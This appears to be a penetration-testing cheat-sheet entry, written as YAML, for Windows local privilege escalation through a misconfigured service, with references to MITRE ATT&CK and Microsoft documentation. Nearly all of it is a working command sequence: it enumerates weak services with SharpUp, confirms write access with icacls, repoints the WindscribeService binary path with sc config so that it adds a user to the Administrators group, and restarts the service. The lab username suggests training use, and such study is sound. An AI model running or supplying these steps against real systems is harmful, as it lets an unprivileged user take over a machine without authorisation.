---
description: |
  This attack abuses weak service permissions by modifying a misconfigured Windows service to execute attacker-controlled code as SYSTEM.
  By changing the service binary path (ImagePath) or replacing the binary, an unprivileged user can escalate to SYSTEM when the service is started.
  
  Command Reference:
    SharpUp.exe audit, icacls, sc config, sc stop, sc start, accesschk.exe, net localgroup
      Target: Windows service with weak ACLs (e.g., WindscribeService)

command: |
  # Enumerate modifiable services
  SharpUp.exe audit

code: |
  # 1. Identify weak service ACLs
  SharpUp.exe audit

  # 2. Confirm write permissions on service binary
  icacls "C:\Program Files (x86)\Windscribe\WindscribeService.exe"  # BUILTIN\Users or Authenticated Users have (F)

  # 3. Modify service image path to run privileged command
  sc config WindscribeService binpath= "cmd /c net localgroup administrators htb-student /add"

  # 4. Stop service to invoke the new ImagePath
  sc stop WindscribeService

  # 5. Start service to execute the cmd and add user to Administrators
  sc start WindscribeService

  # 6. Verify escalation to SYSTEM by checking local admin group membership
  net localgroup administrators

items:
  -
services:
  -
OS:
  - Windows
attack_types:
  - Enumeration
  - Privilege Escalation
references:
  - https://attack.mitre.org/techniques/T1574/005
  - https://docs.microsoft.com/windows-server/administration/windows-commands/sc
---
